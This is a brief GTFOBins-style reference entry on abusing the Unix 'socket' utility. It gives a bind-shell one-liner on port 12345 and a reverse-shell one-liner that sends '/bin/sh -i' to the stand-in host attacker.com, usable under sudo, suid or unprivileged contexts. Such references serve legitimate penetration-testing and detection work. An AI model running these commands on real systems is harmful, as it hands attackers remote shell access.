---
type: gtfobin
name: socket
platform: Unix
functions: [bind-shell, reverse-shell]
tags: [gtfobin, unix, lotl]
---

# socket

## bind-shell

```bash
socket -svp '/bin/sh -i' 12345
```
**Contexts:** sudo, suid, unprivileged

## reverse-shell

```bash
socket -qvp '/bin/sh -i' attacker.com 12345
```
**Contexts:** sudo, suid, unprivileged
